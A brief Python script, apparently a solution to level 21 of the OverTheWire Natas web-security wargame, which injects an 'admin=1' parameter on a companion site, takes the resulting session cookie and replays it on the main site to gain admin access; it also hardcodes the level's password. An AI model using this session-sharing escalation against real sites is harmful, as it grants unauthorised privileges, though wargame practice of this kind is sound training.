import natasX

natas = natasX

sid = natas.natasX(21, "IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php", url="http://natas21-experimenter.natas.labs.overthewire.org", param={"submit": "1", "admin": "1"}).cookies.get("PHPSESSID")
print(natas.natasX(21,"IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php", cookies={"PHPSESSID": sid}).text)